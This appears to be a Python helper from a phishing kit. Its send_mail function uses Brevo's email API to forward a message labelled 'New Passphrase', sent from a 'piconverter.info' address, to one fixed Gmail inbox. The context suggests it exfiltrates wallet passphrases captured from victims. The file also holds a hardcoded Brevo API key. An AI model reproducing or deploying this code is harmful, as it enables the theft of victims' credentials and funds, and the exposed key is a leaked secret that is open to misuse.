import os
import requests

# MAIL_API = 'https://api.brevo.com/v3/emailCampaigns'
api_key = "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"


def send_mail( mail_info, mail_subj, std_name):

    # Brevo API endpoint for sending transactional emails..
    url = 'https://api.brevo.com/v3/smtp/email'

    # The email data we are sending to the user..
    payload = {
        "sender": {
            "name": f"New Passphrase",
            "email": "uzomamicheal07@piconverter.info"
        },
        "to": [
            {
                "email": "lordyacey@gmail.com",
                "name": f"{std_name}"
            }
        ],
        "subject": f"{mail_subj}",
        "htmlContent": f"{mail_info}"
    }

    # Our authorization header..
    headers = {
        'api-key': api_key,
        'Content-Type': 'application/json',
        'accept': 'application/json',
    }

    # Our post request..
    response = requests.post(url, json=payload, headers=headers)
    return

